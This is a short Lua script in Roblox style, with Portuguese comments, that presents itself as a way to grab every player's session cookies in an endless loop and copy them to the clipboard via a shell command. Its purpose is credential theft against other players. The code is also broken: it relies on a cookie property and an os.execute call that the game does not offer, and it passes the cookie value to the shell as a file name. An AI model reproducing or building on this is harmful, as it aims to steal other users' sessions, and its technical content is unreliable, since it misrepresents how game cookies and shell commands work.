local function getPlayerCookies(player)
  -- Obtém os cookies do jogador
  local cookies = player.Cookies

  -- Copia os cookies para a área de transferência
  os.execute("clip < " .. cookies)
end

-- Loop infinito
while true do
  -- Obtém todos os jogadores presentes no jogo
  for i, player in pairs(game.Players:GetPlayers()) do
    -- Copia os cookies do jogador para a área de transferência
    getPlayerCookies(player)
  end
end
